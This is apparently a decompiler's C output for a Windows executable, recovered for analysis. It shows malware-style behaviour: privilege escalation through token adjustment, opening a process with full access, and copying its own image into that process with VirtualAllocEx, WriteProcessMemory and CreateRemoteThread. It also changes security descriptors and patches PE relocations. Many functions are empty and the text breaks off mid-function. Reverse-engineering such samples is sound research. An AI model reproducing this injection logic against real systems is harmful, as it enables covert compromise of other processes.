// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13141340: Register word32 fn13141340(Register word32 edx, Register word32 ebx, Register (ptr Eq_5) ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack Eq_8 dwArg04)
word32 fn13141340(word32 edx, word32 ebx, Eq_5 * ebp, Eq_6 * es, Eq_7 * ds, HANDLE dwArg04)
{
}

// 131413D7: void fn131413D7(Register Eq_67 ecx, Stack Eq_8 dwArg04, Stack Eq_164 dwArg08)
void fn131413D7(Eq_67 ecx, HANDLE dwArg04, LPTHREAD_START_ROUTINE dwArg08)
{
	Eq_67 eax_22 = GetModuleHandleA(0x00);
	Eq_67 edi_26 = *((word32) eax_22 + ((word32) (*((word32) eax_22 + 0x003C)) + 0x0050));
	Eq_67 eax_39 = VirtualAllocEx(dwArg04, eax_22, edi_26, 0x3000, 0x40);
	if (eax_39 == 0x00)
		return;
	WriteProcessMemory(dwArg04, eax_39, eax_22, edi_26, fp - 0x08);
	if (ecx != edi_26)
		return;
	Eq_67 eax_112 = fp - 0x0C ^ fp - 0x0C;
	CreateRemoteThread(dwArg04, eax_112, eax_112, dwArg08, eax_39, eax_112, fp - 0x0C);
}

// 13141442: Register word32 fn13141442(Stack Eq_67 dwArg04)
word32 fn13141442(Eq_67 dwArg04)
{
	Eq_67 ecx_15 = dwArg04;
	word32 eax_14 = 0x00;
	if (*dwArg04 != 0x00)
	{
		do
		{
			eax_14 = eax_14 + 0x01;
			ecx_15 = (word32) ecx_15 + 0x01;
		} while (*ecx_15 != 0x00);
	}
	return eax_14;
}

// 13141454: Register word32 fn13141454(Stack (ptr byte) dwArg04, Stack (ptr Eq_241) dwArg08, Register out ptr32 edxOut)
word32 fn13141454(byte * dwArg04, Eq_241 * dwArg08, ptr32 & edxOut)
{
}

// 13141492: Register (ptr Eq_290) fn13141492(Stack Eq_67 dwArg04, Stack (ptr Eq_241) dwArg08, Stack (ptr Eq_293) dwArg0C, Stack (ptr word32) dwArg10, Stack (ptr ptr32) dwArg14, Register out ptr32 edxOut)
Eq_290 * fn13141492(Eq_67 dwArg04, Eq_241 * dwArg08, Eq_293 * dwArg0C, word32 * dwArg10, ptr32 * dwArg14, ptr32 & edxOut)
{
	*edxOut = edx;
	struct Eq_290 * eax_102;
	Eq_67 esi_10 = dwArg04;
	if (*dwArg04 == 23117)
	{
		eax = Mem0[dwArg04 + 0x3C:word32] + dwArg04;
		if (eax[0x05] == 0xE0)
		{
			union Eq_241 * edi_51 = dwArg08;
			word32 ecx_54 = 0x10;
			while (ecx_54 != 0x00)
			{
				*edi_51 = (union Eq_241 *) *esi_10;
				esi_10 = (word32) esi_10 + 0x04;
				edi_51 = (union Eq_241 *) ((char *) edi_51 + 0x04);
				ecx_54 = ecx_54 - 0x01;
			}
			struct Eq_293 * edi_65 = dwArg0C;
			word32 ecx_68 = 0x06;
			struct Eq_290 * esi_71 = eax;
			while (ecx_68 != 0x00)
			{
				edi_65->dw0000 = esi_71->dw0000;
				esi_71 = esi_71 + 0x01;
				edi_65 = edi_65 + 0x01;
				ecx_68 = ecx_68 - 0x01;
			}
			word32 * edi_84 = dwArg10;
			word32 ecx_87 = 0x38;
			word32 * esi_89 = eax + 0x06;
			while (ecx_87 != 0x00)
			{
				*edi_84 = *esi_89;
				esi_89 = esi_89 + 0x01;
				edi_84 = edi_84 + 0x01;
				ecx_87 = ecx_87 - 0x01;
			}
			*dwArg14 = eax + 0x003E;
			word32 edx_98;
			*edxOut = eax + 0x003E;
			eax_102 = (struct Eq_290 *) DPB(dwArg14, 0x01, 0);
			return eax_102;
		}
	}
	eax_102 = DPB(eax, 0x00, 0);
	return eax_102;
}

// 131414E2: Register int32 fn131414E2(Stack (ptr Eq_383) dwArg08, Stack (ptr Eq_384) dwArg0C, Stack Eq_67 dwArg10, Register out ptr32 edxOut)
int32 fn131414E2(Eq_383 * dwArg08, Eq_384 * dwArg0C, Eq_67 dwArg10, ptr32 & edxOut)
{
	int32 ecx_100 = dwArg0C->dw003C;
	Eq_391 esi_13 = dwArg0C->t0020;
	uint64 edx_eax_16 = (uint64) (uint32) ecx_100;
	uint32 edx_18 = (uint32) (edx_eax_16 % esi_13);
	*edxOut = edx_18;
	Eq_402 eax_19 = (uint32) (edx_eax_16 /u esi_13);
	if (edx_18 != 0x00)
		ecx_100 = ((word32) eax_19 + 0x01) *s esi_13;
	int32 eax_29 = (word32) dwArg08->w0006;
	if (eax_29 > 0x00)
	{
		struct Eq_417 * ebx_61 = (word32) dwArg10 + 0x08;
		int32 dwArg0C_63 = eax_29;
		do
		{
			word32 edi_71 = ebx_61->dw0000;
			if (edi_71 != 0x00)
			{
				uint64 edx_eax_92 = (uint64) (uint32) edi_71;
				uint32 edx_94 = (uint32) (edx_eax_92 % esi_13);
				*edxOut = edx_94;
				Eq_436 eax_95 = (uint32) (edx_eax_92 /u esi_13);
				if (edx_94 == 0x00)
					ecx_100 = ecx_100 + edi_71;
				else
					ecx_100 = ecx_100 + ((word32) eax_95 + 0x01) *s esi_13;
			}
			int32 v17_82 = dwArg0C_63 - 0x01;
			ebx_61 = ebx_61 + 0x01;
			dwArg0C_63 = v17_82;
		} while (v17_82 != 0x00);
	}
	return ecx_100;
}

// 1314153E: Register Eq_67 fn1314153E(Stack Eq_67 dwArg04, Stack Eq_67 dwArg08, Register out ptr32 edxOut)
Eq_67 fn1314153E(Eq_67 dwArg04, Eq_67 dwArg08, ptr32 & edxOut)
{
	uint64 edx_eax_5 = (uint64) (uint32) dwArg04;
	uint32 edx_8 = (uint32) (edx_eax_5 % dwArg08);
	*edxOut = edx_8;
	Eq_462 eax_9 = (uint32) (edx_eax_5 /u dwArg08);
	if (edx_8 != 0x00)
		return ((word32) eax_9 + 0x01) *s dwArg08;
	return dwArg04;
}

// 13141558: FlagGroup bool fn13141558(Register ptr32 ebp, Stack Eq_67 dwArg04, Stack (ptr Eq_473) dwArg10, Stack Eq_67 dwArg18, Register out ptr32 eaxOut, Register out ptr32 edxOut)
bool fn13141558(ptr32 ebp, Eq_67 dwArg04, Eq_473 * dwArg10, Eq_67 dwArg18, ptr32 & eaxOut, ptr32 & edxOut)
{
	struct Eq_477 * esi_27;
	word32 edi_28;
	struct Eq_479 * ebp_100;
	bool D_130 = fn131420F0(dwArg18, dwArg04, dwArg10->t003C, out ebp_100, out esi_27, out edi_28);
	*(fp - 0x1C) = esi_27->dw0020;
	*(fp - 0x20) = esi_27->dw003C;
	word32 edx_37;
	word32 ebx_140 = ebp_100->ptr001C + fn1314153E(dwArg00, dwArg04, out edx_37) / 0x08;
	struct Eq_522 * eax_103 = ebp_100->ptr0010;
	ebp_100->ptr001C = ebp_100->ptr001C & 0x00;
	if (eax_103->w0006 > 0x00)
	{
		*(fp - 0x10) = edi_28;
		struct Eq_550 * edi_106 = ebp_100->dw0018 + 0x08;
		do
		{
			up32 eax_87 = edi_106->dw0008;
			if (true)
			{
				up32 ecx_111 = eax_87;
				up32 eax_112 = edi_106->dw0000;
				if (eax_87 > eax_112)
					ecx_111 = eax_112;
				word32 eax_118 = edi_106->dw000C + ebp_100->dw0008;
				*(fp - 0x14) = ecx_111;
				*(fp - 0x18) = eax_118;
				*(fp - 0x1C) = ebx_140;
				struct Eq_607 * esi_128;
				D_130 = fn131420F0(dwArg00, dwArg04, dwArg08, out ebp_100, out esi_128, out edi_106);
				*(fp - 0x20) = esi_128->dw0020;
				*(fp - 0x24) = edi_106->dw0000;
				word32 edx_137;
				ebx_140 = ebx_140 + fn1314153E(dwArg00, dwArg04, out edx_137);
			}
			eax_103 = (word32) ebp_100->ptr0010->w0006;
			ebp_100->ptr001C = (struct Eq_522 *) ((char *) ebp_100->ptr001C + 0x01);
			edi_106 = edi_106 + 0x01;
		} while (ebp_100->ptr001C < eax_103);
	}
	word32 eax_65;
	*eaxOut = (struct Eq_543 *) DPB(eax_103, 0x01, 0);
	return D_130;
}

// 131415DD: FlagGroup bool fn131415DD(Register (ptr Eq_5) ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack Eq_67 dwArg04, Register out ptr32 eaxOut, Register out ptr32 edxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
bool fn131415DD(Eq_5 * ebp, Eq_6 * es, Eq_7 * ds, Eq_67 dwArg04, ptr32 & eaxOut, ptr32 & edxOut, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	Eq_9 eax_110;
	GetSystemDirectoryA(fp - 0x0110, 0x0104);
	struct Eq_5 * ebp_207 = fp - 0x01D4;
	up32 edx_199 = fn13141442(dwArg04) + fn13141442(fp - 0x0110);
	*edxOut = edx_199;
	HANDLE * esp_166 = fp - 676;
	if (edx_199 >= 0x0104)
		eax_110 = 0x00;
	else
	{
		lstrcatA(fp - 0x0110, dwArg04);
		esp_166 = fp - 0x02C8;
		Eq_8 eax_168 = CreateFileA(fp - 0x0110, 0x80000000, 0x01, 0x00, 0x03, 0x00, null);
		if (eax_168 != (void *) ~0x00)
		{
			GetFileInformationByHandle(eax_168, fp - 0x01B0);
			ptr32 esp_214 = fp - 0x02D0;
			if (dwLoc018C != 0x00)
			{
				esp_214 = fp - 0x02DC;
				Eq_67 eax_270 = HeapAlloc(GetProcessHeap(), 0x00, dwLoc018C);
				if (eax_270 != 0x00)
				{
					ptr32 esp_286 = fp - 0x02F0;
					if (ReadFile(eax_168, eax_270, dwLoc018C, fp - 0x0164, null) != 0x00 && dwLoc0164 == dwLoc018C)
					{
						esp_286 = fp - 0x02F0;
						word32 edx_348;
						if ((byte) fn13141492(eax_270, fp - 336, fp - 0x017C, fp - 656, fp - 0x0154, out edx_348) != 0x00)
						{
							esp_286 = fp - 0x02FC;
							word32 edx_367;
							Eq_67 eax_377 = HeapAlloc(GetProcessHeap(), 0x00, fn131414E2(fp - 0x017C, fp - 656, dwLoc018C, out edx_367));
							if (eax_377 != 0x00)
							{
								word32 eax_400;
								word32 edx_401;
								fn13141558(fp - 0x01D4, eax_270, fp - 656, eax_377, out eax_400, out edx_401);
								esp_286 = fp - 0x02FC;
							}
						}
					}
					word32 * esp_305 = esp_286 - 0x04;
					*esp_305 = *(fp - 344);
					*(esp_305 - 0x04) = 0x00;
					*(esp_309 - 0x04) = (HANDLE *) GetProcessHeap();
					HeapFree(*(esp_309 - 0x04), esp_309->t0000, esp_309->t0004);
					esp_214 = esp_309 - 0x04;
				}
			}
			esp_166 = esp_214 - 0x04;
			*esp_166 = (HANDLE *) ebp_207->t0078;
			CloseHandle(*esp_166);
		}
		eax_110 = ebp_207->t0074;
	}
	struct Eq_708 * esp_90 = (char *) esp_166 + 0x04;
	Eq_8 edi_89 = *esp_166;
	*ediOut = edi_89;
	word32 esi_91 = esp_90->dw0000;
	*esiOut = esi_91;
	word32 ebx_96 = esp_90->dw0004;
	*ebxOut = ebx_96;
	word32 eax_98;
	*eaxOut = fn131420E0(eax_110, ebp_207->dw01CC ^ ebp_207, edx_199, ebx_96, ebp_207, esi_91, edi_89, es, ds, ebp);
	return D;
}

// 1314177C: Register word32 fn1314177C(Stack Eq_67 dwArg04, Stack (ptr Eq_241) dwArg08, Register out ptr32 edxOut)
word32 fn1314177C(Eq_67 dwArg04, Eq_241 * dwArg08, ptr32 & edxOut)
{
}

// 131417F3: Register (ptr Eq_293) fn131417F3(Stack Eq_67 dwArg04, Stack (ptr Eq_241) dwArg08, Stack (ptr Eq_293) dwArg0C)
Eq_293 * fn131417F3(Eq_67 dwArg04, Eq_241 * dwArg08, Eq_293 * dwArg0C)
{
}

// 131418AE: Register word32 fn131418AE(Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn131418AE(ptr32 & esiOut, ptr32 & ediOut)
{
	Eq_67 eax_10 = GetModuleHandleA(0x13141154);
	globals->t13144030 = GetProcAddress(eax_10, 0x13141134);
	globals->t13144038 = GetProcAddress(eax_10, 320082208);
	globals->t13144040 = GetProcAddress(eax_10, 0x13141108);
	globals->t1314403C = GetProcAddress(eax_10, 0x131410F8);
	globals->t13144020 = GetProcAddress(eax_10, 0x131410E4);
	globals->t13144024 = GetProcAddress(eax_10, 0x131410CC);
	Eq_1082 eax_53 = GetProcAddress(eax_10, 0x131410B0);
	globals->t1314402C = eax_53;
	word32 edi_57;
	*ediOut = eax_10;
	word32 esi_60;
	*esiOut = &globals->dw131410B0;
	if (globals->t13144030 == null || (globals->t13144038 == null || (globals->t13144040 == null || (globals->t1314403C == null || (globals->t13144020 == null || (globals->t13144024 == null || eax_53 == null))))))
		return 0x00;
	return 0x01;
}

// 1314195D: Register ui32 fn1314195D()
ui32 fn1314195D()
{
	ptr32 esp_14;
	word32 ebp_15;
	byte SCZO_16;
	word32 eax_17;
	byte SZO_18;
	byte C_19;
	byte Z_20;
	word32 ecx_21;
	globals->t13144038();
	*(esp_14 - 0x04) = 0x01;
	*(esp_14 - 0x08) = fp - 0x10;
	*(esp_14 - 0x0C) = fp - 0x18;
	ptr32 esp_30;
	word32 ebp_31;
	byte SCZO_32;
	byte SZO_34;
	byte C_35;
	byte Z_36;
	word32 ecx_37;
	ui32 eax_33;
	globals->t13144030();
	if (eax_33 != 0x00)
		return eax_33 | ~0x00;
	*(esp_30 - 0x04) = fp - 0x30;
	*(esp_30 - 0x08) = 0x06;
	*(esp_30 - 0x0C) = fp - 0x08;
	word32 esp_95;
	word32 ebp_96;
	byte SCZO_97;
	byte SZO_99;
	byte C_100;
	byte Z_101;
	word32 ecx_102;
	globals->t1314403C();
	if (eax_33 != 0x00)
		return eax_33 | ~0x00;
	return dwLoc08;
}

// 131419C3: Register word32 fn131419C3(Stack Eq_67 dwArg04, Stack (ptr Eq_241) dwArg08, Stack (ptr Eq_293) dwArg0C, Stack (ptr word32) dwArg10, Register out ptr32 edxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn131419C3(Eq_67 dwArg04, Eq_241 * dwArg08, Eq_293 * dwArg0C, word32 * dwArg10, ptr32 & edxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 eax_67;
	*dwArg10 = 0x00;
	struct Eq_1239 * esp_54;
	word32 ebp_55;
	word32 ecx_56;
	word32 eax_57;
	word32 * esi_58;
	word32 edi_59;
	word32 edx_60;
	byte SZO_61;
	byte C_62;
	byte Z_63;
	globals->t13144020();
	word32 ecx_31 = *dwArg08;
	if (eax_57 != 0x00)
		eax_67 = 0x00;
	else
	{
		*esi_58 = ecx_31;
		eax_67 = 0x01;
	}
	word32 edi_70;
	*ediOut = esp_54->dw0000;
	word32 esi_72;
	*esiOut = esp_54->dw0004;
	return eax_67;
}

// 13141A0C: void fn13141A0C(Stack Eq_67 dwArg04)
void fn13141A0C(Eq_67 dwArg04)
{
	word32 esp_9;
	globals->t13144024();
}

// 13141A19: Register word32 fn13141A19(Register up32 edx, Register word32 ebx, Register (ptr Eq_5) ebp, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Register out ptr32 ediOut)
word32 fn13141A19(up32 edx, word32 ebx, Eq_5 * ebp, Eq_6 * es, Eq_7 * ds, ptr32 & ediOut)
{
	Eq_9 eax_129;
	ptr32 esp_25;
	word32 ebp_26;
	byte SCZO_27;
	word32 eax_28;
	byte SZO_29;
	byte C_30;
	word32 esi_31;
	word32 edi_32;
	byte Z_33;
	word32 ecx_34;
	word32 edx_35;
	word32 ebx_36;
	struct Eq_1296 * es_37;
	struct Eq_1297 * ds_38;
	globals->t13144038();
	ui32 eax_9 = globals->dw13144000 ^ fp - 232;
	*(esp_25 - 0x04) = 0x01;
	*(esp_25 - 0x08) = fp - 0x0168;
	*(esp_25 - 0x0C) = fp - 0x0160;
	byte SCZO_53;
	word32 eax_54;
	byte SZO_55;
	byte C_56;
	word32 esi_57;
	word32 edi_58;
	byte Z_59;
	word32 ecx_60;
	struct Eq_7 * ds_118;
	struct Eq_6 * es_119;
	word32 ebx_120;
	up32 edx_121;
	struct Eq_5 * ebp_127;
	struct Eq_1340 * esp_128;
	globals->t13144030();
	if (eax_54 == 0x00)
	{
		*(esp_128 - 0x04) = fp - 0x0134;
		*(esp_128 - 0x08) = 0x00060000;
		*(esp_128 - 0x0C) = fp - 0x0114;
		byte SCZO_158;
		word32 eax_159;
		byte SZO_160;
		byte C_161;
		word32 esi_162;
		word32 edi_163;
		byte Z_164;
		word32 ecx_165;
		globals->t1314403C();
		if (eax_159 == 0x00)
		{
			*(esp_128 - 0x04) = fp - 344;
			*(esp_128 - 0x08) = 0x00;
			*(esp_128 - 0x0C) = fp - 0x0118;
			*(esp_128 - 0x10) = 0x00;
			*(esp_128 - 0x14) = 0x00;
			*(esp_128 - 0x18) = 0x04;
			*(esp_128 - 0x1C) = 0x06;
			*(esp_128 - 0x20) = dwLoc0114;
			byte SCZO_195;
			word32 eax_196;
			byte SZO_197;
			byte C_198;
			word32 edi_200;
			byte Z_201;
			word32 ecx_202;
			Eq_9 esi_199;
			ADVAPI32.dll!GetSecurityInfo();
			if ((fp - 0x0118 & fp - 0x0118) == 0x00)
			{
				*(esp_128 - 0x04) = (union Eq_1457 *) (fp - 0x011C);
				*(esp_128 - 0x08) = (union Eq_1464 *) (fp - 0x010C);
				GetUserNameA(*(esp_128 - 0x08), *(esp_128 - 0x04));
				*(esp_128 - 0x0C) = (union Eq_1485 *) (fp - 0x0110);
				*(esp_128 - 0x10) = dwLoc0118;
				*(esp_128 - 0x14) = (union Eq_1498 *) (fp - 0x0154);
				*(esp_128 - 0x18) = 0x01;
				byte SCZO_264;
				word32 eax_265;
				byte SZO_266;
				byte C_267;
				word32 edi_269;
				byte Z_270;
				word32 ecx_271;
				ADVAPI32.dll!SetEntriesInAclA();
				if ((fp - 0x0154 & fp - 0x0154) == 0x00)
				{
					*(esp_128 - 0x04) = 0x00;
					*(esp_128 - 0x08) = dwLoc0110;
					*(esp_128 - 0x0C) = 0x00;
					*(esp_128 - 0x10) = 0x00;
					*(esp_128 - 0x14) = 0x04;
					*(esp_128 - 0x18) = 0x06;
					*(esp_128 - 0x1C) = dwLoc0114;
					ptr32 esp_296;
					byte SCZO_298;
					word32 eax_299;
					byte SZO_300;
					byte C_301;
					word32 edi_303;
					byte Z_304;
					word32 ecx_305;
					ADVAPI32.dll!SetSecurityInfo();
					if (eax_299 == 0x00)
						esi_199 = 0x01;
					*(esp_296 - 0x04) = dwLoc0110;
					LocalFree(*(esp_296 - 0x04));
					esp_128 = esp_296 - 0x04;
				}
			}
			eax_129 = esi_199;
l13141B22:
			Eq_8 edi_98 = esp_128->t0000;
			*ediOut = edi_98;
			word32 esi_103 = esp_128->dw0004;
			fn131420E0(eax_129, eax_9 ^ fp - 232, edx_121, ebx_120, ebp_127, esi_103, edi_98, es_119, ds_118, ebp);
			return esi_103;
		}
	}
	eax_129 = 0x00;
	goto l13141B22;
}

// 13141B39: Register word32 fn13141B39(Register out (ptr Eq_1591) ebpOut, Register out ptr32 esiOut)
word32 fn13141B39(Eq_1591 * & ebpOut, ptr32 & esiOut)
{
}

// 13141BDF: Register word32 fn13141BDF(Stack Eq_67 dwArg04, Stack ui32 dwArg08, Stack (ptr Eq_293) dwArg0C, Register out ptr32 edxOut)
word32 fn13141BDF(Eq_67 dwArg04, ui32 dwArg08, Eq_293 * dwArg0C, ptr32 & edxOut)
{
}

// 13141C57: Register word32 fn13141C57(Register Eq_1873 ecx, Stack Eq_67 dwArg04, Stack (ptr Eq_241) dwArg08, Stack (ptr Eq_293) dwArg0C, Register out ptr32 edxOut)
word32 fn13141C57(Eq_1873 ecx, Eq_67 dwArg04, Eq_241 * dwArg08, Eq_293 * dwArg0C, ptr32 & edxOut)
{
}

// 13141CFF: Register Eq_67 fn13141CFF(Stack Eq_67 dwArg04)
Eq_67 fn13141CFF(Eq_67 dwArg04)
{
	Eq_8 eax_3 = globals->t13144034;
	if (eax_3 == null)
		return 0x00;
	return HeapAlloc(eax_3, 0x00, dwArg04);
}

// 13141DC8: void fn13141DC8()
void fn13141DC8()
{
	OpenProcessToken(GetCurrentProcess(), 0x28, fp - 0x08);
	LookupPrivilegeValueA(0x00, 0x13141280, fp - 0x10);
	AdjustTokenPrivileges(dwLoc08, 0x00, fp - 0x20, 0x10, null, null);
	CloseHandle(dwLoc08);
}

// 13141E2C: Register up32 fn13141E2C(Register up32 edx, Register word32 ebx, Register (ptr Eq_5) ebp, Register word32 esi, Register Eq_8 edi, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Register out ptr32 ebxOut)
up32 fn13141E2C(up32 edx, word32 ebx, Eq_5 * ebp, word32 esi, HANDLE edi, Eq_6 * es, Eq_7 * ds, ptr32 & ebxOut)
{
	*ebxOut = ebx;
	Eq_9 eax_112;
	struct Eq_5 * ebp_114 = fp - 0x7C;
	Eq_9 eax_15 = GetVersionExA(fp - 0x9C);
	if (dwLoc98 != 0x05)
	{
l13141E58:
		eax_112 = DPB(eax_15, 0x01, 0);
		goto l13142080;
	}
	eax_15 = dwLoc94;
	if (dwLoc94 != 0x00 && dwLoc94 != 0x01)
		goto l13141E58;
	globals->t13144028 = dwLoc94;
	eax_15 = fn131418AE(out esi, out edi);
	if (eax_15 == 0x00)
		goto l13141E58;
	esi = fn13141A19(edx, ebx, fp - 0x7C, es, ds, out edi);
	if (fn1314195D() == ~0x00)
	{
		eax_15 = fn1314195D();
		if (eax_15 == ~0x00)
			goto l13141E58;
	}
	*(fp - 0x01FC) = (HANDLE *) edi;
	*(fp - 0x0200) = 320082620;
	word32 eax_89;
	word32 edi_93;
	fn131415DD(fp - 0x7C, es, ds, dwArg00, out eax_89, out edx, out ebx, out esi, out edi_93);
	*(fp - 244) = eax_89;
	HANDLE * esp_100 = fp - 0x01FC;
	if (eax_89 == 0x00)
	{
		eax_112 = (Eq_9) DPB(eax_89, 0x01, 0);
		goto l1314207F;
	}
	word32 * esp_151;
	*(fp - 0x0200) = esi;
	*(fp - 0x0204) = 0x131412A0;
	*(fp - 0x0208) = eax_89;
	word32 eax_128 = fn1314177C(dwArg00, dwArg04, out edx);
	*(fp - 252) = eax_128;
	if (eax_128 == 0x00)
	{
l13141EEE:
		esp_151 = fp - 0x0200;
		eax_112 = (Eq_9) DPB(eax_128, 0x01, 0);
		goto l1314207E;
	}
	*(fp - 0x0204) = fp - 0xF8;
	*(fp - 0x0208) = fp - 500;
	*(fp - 0x020C) = fp - 0x0114;
	*(fp - 0x0210) = fp - 220;
	*(fp - 0x0214) = eax_89;
	eax_128 = fn13141492(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, out edx);
	if ((byte) eax_128 == 0x00)
		goto l13141EEE;
	*(fp - 0x0204) = ebx;
	word32 esi_189;
	word32 eax_190 = fn13141B39(out ebp_114, out esi_189);
	*(ebp_114 - 100) = *(ebp_114 - 100) & 0x00;
	word32 ecx_196 = eax_190 - 0x80000000 - *(ebp_114 - 0x015C);
	*(ebp_114 - 0x70) = eax_190 - 0x80000000 + esi_189;
	*(fp - 0x0208) = ebp_114 - 100;
	*(fp - 0x020C) = ebp_114 - 0x68;
	*(fp - 0x0210) = ebp_114 - 0x70;
	*(fp - 0x0214) = *(ebp_114 - 0x6C);
	*(ebp_114 - 0x7C) = ecx_196;
	*(ebp_114 - 0x68) = 0x2000;
	word32 esi_217;
	word32 edi_218;
	BOOL eax_219 = fn131419C3(dwArg00, dwArg04, dwArg08, dwArg0C, out edx, out esi_217, out edi_218);
	word32 * esp_220 = fp - 0x0204;
	if (eax_219 == 0x00)
	{
l1314207B:
		eax_112 = DPB(eax_219, 0x00, 0);
		goto l1314207D;
	}
	else
	{
		word32 esi_254 = esi_217 - *(ebp_114 - 0x70);
		up32 eax_256 = *(ebp_114 - 0x68) - esi_254;
		if (eax_256 >= 0x04)
		{
			edx = *(ebp_114 - 100);
			struct Eq_2338 * ecx_277 = esi_254 + edx;
			word32 esi_278 = ecx_277->dw0000;
			if (eax_256 >= 0x0C)
			{
				eax_256 = ecx_277->dw0008;
				*(ebp_114 - 116) = eax_256;
			}
			*(fp - 0x0208) = edx;
			fn13141A0C(dwArg00);
			if (*(ebp_114 - 116) < 300)
			{
				*(ebp_114 - 100) = *(ebp_114 - 100) & 0x00;
				*(fp - 0x0208) = ebp_114 - 100;
				*(fp - 0x020C) = ebp_114 - 0x68;
				*(fp - 0x0210) = ebp_114 - 0x70;
				*(fp - 0x0214) = *(ebp_114 - 0x6C);
				*(ebp_114 - 0x70) = esi_278 + 0x80000000;
				*(ebp_114 - 0x68) = 0x2000;
				word32 esi_306;
				word32 edi_307;
				eax_219 = fn131419C3(dwArg00, dwArg04, dwArg08, dwArg0C, out edx, out esi_306, out edi_307);
				esp_220 = fp - 0x0204;
				if (eax_219 == 0x00)
					goto l1314207B;
				uint32 eax_317 = *(ebp_114 - 0x68) - (edi_307 - *(ebp_114 - 0x70));
				uint32 ebx_314 = *(ebp_114 - 116);
				eax_219 = eax_317 >> 0x02;
				if (eax_317 >> 0x02 >= ebx_314)
				{
					*(fp - 0x0208) = ebx_314 << 0x02;
					eax_256 = fn13141CFF(dwArg00);
					*(ebp_114 - 0x6C) = eax_256;
					if (eax_256 != 0x00)
					{
						*(fp - 0x0208) = 320082580;
						word32 ebx_337;
						word32 esi_338;
						word32 edi_339;
						fn131415DD(ebp_114, es, ds, dwArg00, out eax_256, out edx, out ebx_337, out esi_338, out edi_339);
						if (eax_256 != 0x00)
						{
							*(fp - 0x0208) = ebx_337;
							*(fp - 0x020C) = *(ebp_114 - 0x6C);
							*(fp - 0x0210) = eax_256;
							Eq_1873 ecx_353 = fn131417F3(dwArg00, dwArg04, dwArg08);
							Eq_9 ebx_355 = esi_338 + *(ebp_114 - 100);
							*(fp - 0x0214) = ebp_114 - 0x0178;
							*(fp - 0x0218) = *(ebp_114 - 0x80);
							*(fp - 0x021C) = *(ebp_114 - 0x78);
							eax_219 = fn13141C57(ecx_353, dwArg00, dwArg04, dwArg08, out edx);
							ptr32 esp_368 = fp - 0x0204;
							uint32 esi_369 = (word32) eax_219 + *(ebp_114 - 0x78);
							if (esi_369 != 0x00 && ((edi_339 - *(ebp_114 - 0x015C)) - *(ebp_114 - 0x7C)) + *(ebp_114 - 0x78) != esi_369)
							{
								*(fp - 0x0208) = 0x04;
								*(fp - 0x020C) = esi_369;
								esp_368 = fp - 0x020C;
								eax_219 = IsBadReadPtr(*(fp - 0x020C), *(fp - 0x0208));
								if (eax_219 == 0x00)
								{
									ui32 eax_403 = *(ebp_114 - 116);
									*(fp - 0x0210) = 0x04;
									*(fp - 0x0214) = (eax_403 << 0x02) - 0x04 + esi_369;
									esp_368 = fp - 0x0214;
									eax_219 = IsBadReadPtr(*(fp - 0x0214), *(fp - 0x0210));
									if (eax_219 == 0x00)
									{
										word32 edi_414 = *(ebp_114 - 116);
										if (true)
										{
											eax_219 = ebx_355;
											Eq_2673 esi_420 = esi_369 - ebx_355;
											do
											{
												edx = *(ebp_114 - 0x7C);
												word32 ecx_428 = Mem409[esi_420 + eax_219:word32];
												if (*eax_219 - edx - 0x80000000 != ecx_428)
													*eax_219 = (Eq_9) (ecx_428 + 0x80000000 + edx);
												eax_219 = eax_219 + 0x04;
												edi_414 = edi_414 - 0x01;
											} while (edi_414 != 0x00);
										}
									}
								}
							}
							word32 * esp_385 = esp_368 - 0x04;
							*esp_385 = *(ebp_114 - 100);
							fn13141A0C(dwArg00);
							esp_220 = esp_385 + 0x01;
							goto l1314207B;
						}
					}
					goto l1314208F;
				}
				goto l1314207B;
			}
		}
l1314208F:
		esp_220 = fp - 0x0204;
		eax_112 = (Eq_9) DPB(eax_256, 0x01, 0);
l1314207D:
		*ebxOut = *esp_220;
		esp_151 = esp_220 + 0x01;
l1314207E:
		esi = *esp_151;
		esp_100 = (HANDLE *) (esp_151 + 0x01);
l1314207F:
		edi = (Eq_8) *esp_100;
l13142080:
		fn131420E0(eax_112, ebp_114->t0074 ^ ebp_114, edx, ebx, ebp_114, esi, edi, es, ds, ebp);
		return edx;
	}
}

// 13142093: Register Eq_67 Win32CrtStartup()
Eq_67 Win32CrtStartup()
{
	fn13141DC8();
	word32 ebx_9;
	word32 edx_10 = fn13141E2C(edx, ebx, ebp, esi, edi, es, ds, out ebx_9);
	*(fp - 0x04) = 0x13141D19;
	*(fp - 0x08) = 320082636;
	word32 eax_16 = fn13141340(edx_10, ebx_9, ebp, es, ds, dwArg00);
	Eq_67 ecx_17 = *(fp - 0x08);
	*(fp - 0x08) = eax_16;
	*(fp - 0x0C) = 0x00;
	*(fp - 0x10) = 0x001F0FFF;
	*(fp - 0x14) = (HANDLE *) OpenProcess(*(fp - 0x10), *(fp - 0x0C), *(fp - 0x08));
	fn131413D7(ecx_17, dwArg00, dwArg04);
	return 0x00;
}

// 131420E0: Register Eq_9 fn131420E0(Register Eq_9 eax, Register ui32 ecx, Register up32 edx, Register word32 ebx, Register (ptr Eq_5) ebp, Register word32 esi, Register Eq_8 edi, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack (ptr Eq_5) dwArg00)
BOOL fn131420E0(BOOL eax, ui32 ecx, up32 edx, word32 ebx, Eq_5 * ebp, word32 esi, HANDLE edi, Eq_6 * es, Eq_7 * ds, Eq_5 * dwArg00)
{
	if (ecx == globals->dw13144000)
		return eax;
	globals->t13144150 = eax;
	globals->dw1314414C = ecx;
	globals->dw13144148 = edx;
	globals->dw13144144 = ebx;
	globals->dw13144140 = esi;
	globals->t1314413C = edi;
	globals->ptr13144168 = ss;
	globals->ptr1314415C = cs;
	globals->ptr13144138 = ds;
	globals->ptr13144134 = es;
	globals->ptr13144130 = fs;
	globals->ptr1314412C = gs;
	globals->t13144160 = cond(fp - 0x032C);
	globals->ptr13144154 = ebp;
	globals->ptr13144158 = dwArg00;
